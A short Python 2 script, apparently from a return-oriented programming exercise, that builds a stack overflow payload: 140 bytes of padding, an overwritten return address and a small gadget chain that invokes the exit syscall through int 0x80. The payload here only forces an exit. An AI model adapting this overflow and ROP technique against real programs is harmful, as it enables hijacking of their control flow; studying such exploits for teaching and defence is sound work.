import struct

# 0xb7e4a5f2: inc eax; ret <--- EXIT SYSCALL
# 0x080482f5: pop ebx; ret <--- EXIT CODE
# 0xb7fdee03: int 0x80     <--- CALL KERNEL
def gen_chain():
  gadgets = [
    0x080482f5, # pop ebx; ret
    0x43434343, # filler (return code)
    0xb7fdee03, # int 0x80
  ]
  return ''.join(struct.pack('<I', _) for _ in gadgets)

offset    = "A" * 140
retAddr   = struct.pack('<L', 0xb7e4a5f2)
rop_chain = gen_chain()

payload = offset + retAddr + rop_chain

print payload
